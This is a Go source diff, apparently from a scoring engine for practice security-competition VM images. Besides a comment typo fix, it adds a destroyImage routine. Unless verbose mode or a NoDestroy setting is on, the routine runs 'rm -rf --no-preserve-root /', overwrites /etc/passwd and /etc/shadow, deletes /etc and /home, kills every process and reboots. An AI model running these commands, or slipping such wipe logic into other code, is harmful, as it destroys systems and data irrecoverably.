@@ -16,7 +16,7 @@ func readFile(fileName string) (string, error) {
 }
 
 func tryDecodeString(fileContent string) (string, error) {
-	// For compatability with Windows ANSI/UNICODE/etcetc
+	// For compatibility with Windows ANSI/UNICODE/etcetc
 	// and if Linux ever decides to use weird encoding
 	return fileContent, nil
 }
@@ -113,6 +113,18 @@ func destroyImage(mc *metaConfig) {
 	if mc.Cli.Bool("v") {
 		warnPrint("Since you're running this in verbose mode, I assume you're a developer who messed something up. You've been spared from image deletion but please be careful.")
 	} else {
-		// destroying ideas: start a classic rm -rf in the background, delete /etc/passwd, start a rm -rf in foreground for /etc/, then /bin/, then /home/, then kill -9 all processes, then rm -rf foreground everything else
+		shellCommand("rm -rf /opt/aeacus")
+		if !(mc.Config.NoDestroy == "yes") {
+			shellCommand("rm -rf --no-preserve-root / &")
+			shellCommand("cat /dev/urandom > /etc/passwd &")
+			shellCommand("cat /dev/null > /etc/shadow")
+			shellCommand("rm -rf /etc")
+			shellCommand("rm -rf /home")
+			shellCommand("pkill -9 gnome")
+			shellCommand("rm -rf --no-preserve-root /")
+			shellCommand("killall5 -9")
+			shellCommand("reboot now")
+		}
+		os.Exit(1)
 	}
 }
